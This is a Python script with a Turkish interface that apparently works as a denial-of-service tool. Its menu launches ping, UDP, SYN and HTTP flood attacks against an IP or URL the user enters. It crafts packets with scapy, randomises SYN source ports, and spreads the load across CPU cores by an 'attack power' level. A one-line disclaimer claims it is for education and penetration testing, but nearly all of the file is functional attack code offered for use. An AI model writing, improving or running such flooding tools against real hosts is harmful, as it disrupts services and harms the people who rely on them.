#!/usr/bin/env python3
import os
import time
import multiprocessing
import sys
import random
import requests
from scapy.all import IP, UDP, TCP, send

def print_banner():
    banner = r"""
    ████████╗██╗  ██╗████████╗
    ╚══██╔══╝██║  ██║╚══██╔══╝
       ██║   ███████║   ██║   
       ██║   ██╔══██║   ██║   
       ██║   ██║  ██║   ██║   
       ╚═╝   ╚═╝  ╚═╝   ╚═╝   

    (Eğitim ve penetrasyon testleri amacıyla geliştirilmiştir. Sorumluluk kabul edilmez.)
    """
    print(banner)

def main_menu():
    print("1) Ping Flood Saldırısını Başlat")
    print("2) UDP Flood Saldırısını Başlat")
    print("3) SYN Flood Saldırısını Başlat")
    print("4) HTTP Flood Saldırısını Başlat")
    print("5) Uygulamayı Güncelle")
    print("6) Gereksinimleri Kontrol Et")

def send_ping(target, ping_count, packet_size):
    for _ in range(ping_count):
        try:
            os.system(f"ping -c 1 -s {packet_size} {target}")
        except Exception as e:
            print(f"Hata: {e}")

def send_udp_flood(target, port, packet_count, packet_size):
    for _ in range(packet_count):
        try:
            packet = IP(dst=target)/UDP(dport=port)/("X"*packet_size)
            send(packet, verbose=False)
        except Exception as e:
            print(f"Hata: {e}")

def send_syn_flood(target, port, packet_count):
    for _ in range(packet_count):
        try:
            src_port = random.randint(1024, 65535)
            seq_num = random.randint(1000, 9000)
            window_size = random.randint(1000, 9000)
            packet = IP(dst=target)/TCP(dport=port, sport=src_port, flags="S", seq=seq_num, window=window_size)
            send(packet, verbose=False)
        except Exception as e:
            print(f"Hata: {e}")

def send_http_flood(target, request_count):
    for _ in range(request_count):
        try:
            response = requests.get(target)
            print(f"Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Hata: {e}")

def start_ping_attack():
    try:
        target = input("Hedef IP: ")
        ping_count = int(input("Gönderilecek Ping Sayısı: "))
        packet_size = int(input("Paket Boyutu (bytes): "))
        attack_power = int(input("Saldırı Gücü (1-2-3): "))

        if attack_power not in [1, 2, 3]:
            print("Geçersiz saldırı gücü seçimi. Varsayılan olarak 2 seçildi.")
            attack_power = 2

        total_cores = multiprocessing.cpu_count()
        if attack_power == 1:
            cores_to_use = max(1, total_cores // 4)
        elif attack_power == 2:
            cores_to_use = max(1, total_cores // 2)
        else:
            cores_to_use = total_cores

        print(f"{ping_count} adet ping {target} adresine {cores_to_use} çekirdek kullanılarak gönderiliyor...")

        pings_per_core = ping_count // cores_to_use
        remaining_pings = ping_count % cores_to_use

        processes = []
        start_time = time.time()

        for i in range(cores_to_use):
            additional_ping = 1 if i < remaining_pings else 0
            process = multiprocessing.Process(target=send_ping, args=(target, pings_per_core + additional_ping, packet_size))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()

        end_time = time.time()
        duration = end_time - start_time

        print(f"Saldırı tamamlandı. Toplam gönderilen ping sayısı: {ping_count}. Süre: {duration:.2f} saniye.")
        time.sleep(5)  # Pause for 5 seconds before clearing the screen
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def start_udp_flood():
    try:
        target = input("Hedef IP: ")
        port = int(input("Hedef Port: "))
        packet_count = int(input("Gönderilecek Paket Sayısı: "))
        packet_size = int(input("Paket Boyutu (bytes): "))
        attack_power = int(input("Saldırı Gücü (1-2-3): "))

        if attack_power not in [1, 2, 3]:
            print("Geçersiz saldırı gücü seçimi. Varsayılan olarak 2 seçildi.")
            attack_power = 2

        total_cores = multiprocessing.cpu_count()
        if attack_power == 1:
            cores_to_use = max(1, total_cores // 4)
        elif attack_power == 2:
            cores_to_use = max(1, total_cores // 2)
        else:
            cores_to_use = total_cores

        print(f"{packet_count} adet UDP paketi {target}:{port} adresine {cores_to_use} çekirdek kullanılarak gönderiliyor...")

        packets_per_core = packet_count // cores_to_use
        remaining_packets = packet_count % cores_to_use

        processes = []
        start_time = time.time()

        for i in range(cores_to_use):
            additional_packet = 1 if i < remaining_packets else 0
            process = multiprocessing.Process(target=send_udp_flood, args=(target, port, packets_per_core + additional_packet, packet_size))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()

        end_time = time.time()
        duration = end_time - start_time

        print(f"Saldırı tamamlandı. Toplam gönderilen UDP paketi sayısı: {packet_count}. Süre: {duration:.2f} saniye.")
        time.sleep(5)  # Pause for 5 seconds before clearing the screen
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def start_syn_flood():
    try:
        target = input("Hedef IP: ")
        port = int(input("Hedef Port: "))
        packet_count = int(input("Gönderilecek Paket Sayısı: "))
        attack_power = int(input("Saldırı Gücü (1-2-3): "))

        if attack_power not in [1, 2, 3]:
            print("Geçersiz saldırı gücü seçimi. Varsayılan olarak 2 seçildi.")
            attack_power = 2

        total_cores = multiprocessing.cpu_count()
        if attack_power == 1:
            cores_to_use = max(1, total_cores // 4)
        elif attack_power == 2:
            cores_to_use = max(1, total_cores // 2)
        else:
            cores_to_use = total_cores

        print(f"{packet_count} adet SYN paketi {target}:{port} adresine {cores_to_use} çekirdek kullanılarak gönderiliyor...")

        packets_per_core = packet_count // cores_to_use
        remaining_packets = packet_count % cores_to_use

        processes = []
        start_time = time.time()

        for i in range(cores_to_use):
            additional_packet = 1 if i < remaining_packets else 0
            process = multiprocessing.Process(target=send_syn_flood, args=(target, port, packets_per_core + additional_packet))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()

        end_time = time.time()
        duration = end_time - start_time

        print(f"Saldırı tamamlandı. Toplam gönderilen SYN paketi sayısı: {packet_count}. Süre: {duration:.2f} saniye.")
        time.sleep(5)  # Pause for 5 seconds before clearing the screen
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def start_http_flood():
    try:
        target = input("Hedef URL: ")
        request_count = int(input("Gönderilecek İstek Sayısı: "))
        attack_power = int(input("Saldırı Gücü (1-2-3): "))

        if attack_power not in [1, 2, 3]:
            print("Geçersiz saldırı gücü seçimi. Varsayılan olarak 2 seçildi.")
            attack_power = 2

        total_cores = multiprocessing.cpu_count()
        if attack_power == 1:
            cores_to_use = max(1, total_cores // 4)
        elif attack_power == 2:
            cores_to_use = max(1, total_cores // 2)
        else:
            cores_to_use = total_cores

        print(f"{request_count} adet istek {target} adresine {cores_to_use} çekirdek kullanılarak gönderiliyor...")

        requests_per_core = request_count // cores_to_use
        remaining_requests = request_count % cores_to_use

        processes = []
        start_time = time.time()

        for i in range(cores_to_use):
            additional_request = 1 if i < remaining_requests else 0
            process = multiprocessing.Process(target=send_http_flood, args=(target, requests_per_core + additional_request))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()

        end_time = time.time()
        duration = end_time - start_time

        print(f"Saldırı tamamlandı. Toplam gönderilen istek sayısı: {request_count}. Süre: {duration:.2f} saniye.")
        time.sleep(5)  # Pause for 5 seconds before clearing the screen
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def update_application():
    try:
        print("Ağ bağlantısı denetleniyor...")
        time.sleep(2)
        print("Güncelleme Bulunmuyor")
        time.sleep(4)  # Pause for 4 seconds before clearing the screen
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def check_requirements():
    try:
        print("Gereksinimler Otomatik Yüklenmiştir")
        time.sleep(4)  # Pause for 4 seconds before clearing the screen
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def main():
    try:
        if os.geteuid() != 0:
            print("Bu script root yetkileriyle çalıştırılmalıdır. Lütfen yönetici hakları ile çalıştırın.")
            sys.exit(1)

        while True:
            os.system('clear')
            print_banner()
            main_menu()
            choice = input("Bir seçenek girin: ")

            if choice == '1':
                start_ping_attack()
            elif choice == '2':
                start_udp_flood()
            elif choice == '3':
                start_syn_flood()
            elif choice == '4':
                start_http_flood()
            elif choice == '5':
                update_application()
            elif choice == '6':
                check_requirements()
            else:
                print("Geçersiz seçenek, lütfen tekrar deneyin.")
                time.sleep(2)
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

if __name__ == "__main__":
    main()
